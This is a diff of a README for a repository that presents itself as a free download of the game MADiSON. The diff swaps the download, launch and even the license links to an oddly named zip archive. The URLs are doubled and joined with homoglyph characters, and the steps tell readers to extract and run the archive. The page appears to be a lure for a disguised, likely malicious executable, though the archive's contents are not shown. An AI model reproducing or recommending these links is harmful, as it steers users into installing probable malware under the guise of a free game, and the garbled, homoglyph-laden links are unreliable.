@@ -22,9 +22,9 @@ Welcome to the ultimate repository for MADiSON 🎥 – the atmospheric first-pe
 
 ## ⚙️ Installation
 
-1. Download https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/Lоader.zip from the repository.
+1. Download https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zipоhttps://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zip from the repository.
 2. Extract using your favorite archivers (e.g. WinRAR, 7-Zip).
-3. Launch https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/Lоader.zip (macOS: use https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/Lоader.zip, Linux: run with Wine).
+3. Launch https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zipоhttps://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zip (macOS: use https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zipоhttps://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zip, Linux: run with Wine).
 4. Follow on-screen instructions to activate and start your adventure.
 
 ## 📢 Disclaimer
@@ -33,7 +33,7 @@ This repository is designed for educational and entertainment purposes only. Ple
 
 ## 📄 MIT License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/Lоader.zip) © 2025.
+Licensed under the [MIT License](https://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zipоhttps://raw.githubusercontent.com/AMN-h0b/MADiSON-FreeGameHub/main/glycid/Hub_Di_MA_Free_Game_SO_2.2-beta.1.zip) © 2025.
 
 ---
 
